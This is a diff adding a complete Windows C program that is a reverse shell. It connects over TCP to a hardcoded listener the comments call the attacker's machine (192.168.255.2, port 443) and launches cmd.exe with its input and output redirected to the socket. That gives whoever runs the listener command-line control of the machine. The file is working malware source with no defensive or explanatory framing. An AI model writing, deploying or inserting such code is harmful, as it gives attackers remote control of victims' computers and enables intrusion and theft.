@@ -1,0 +1,42 @@
+#include <winsock2.h>
+#include <ws2tcpip.h>
+#include <stdio.h>
+#include <crtdbg.h>
+
+#pragma comment(lib, "ws2_32.lib")
+
+WSADATA wsaData;
+SOCKET wSock;
+struct sockaddr_in hax;
+STARTUPINFO sui;
+PROCESS_INFORMATION pi;
+
+int main(int argc, char* argv[]) {
+    // listener ip, port on attacker's machine
+    wchar_t ip[] = L"192.168.255.2";
+    short port = 443;
+    wchar_t command[] = L"cmd.exe";
+
+    // init socket lib
+    WSAStartup(MAKEWORD(2, 2), &wsaData);
+
+    // create socket
+    wSock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
+
+    hax.sin_family = AF_INET;
+    hax.sin_port = htons(port);
+    InetPtonW(AF_INET, ip, &hax.sin_addr);
+
+    // connect to remote host
+    connect(wSock, (SOCKADDR*)&hax, sizeof(hax));
+
+    memset(&sui, 0, sizeof(sui));
+    sui.cb = sizeof(sui);
+    sui.dwFlags = STARTF_USESTDHANDLES;
+    sui.hStdInput = sui.hStdOutput = sui.hStdError = (HANDLE)wSock;
+
+    // start cmd.exe with redirected streams
+    CreateProcessW(NULL, command, NULL, NULL, TRUE, 0, NULL, NULL, &sui, &pi);
+
+    exit(0);
+}
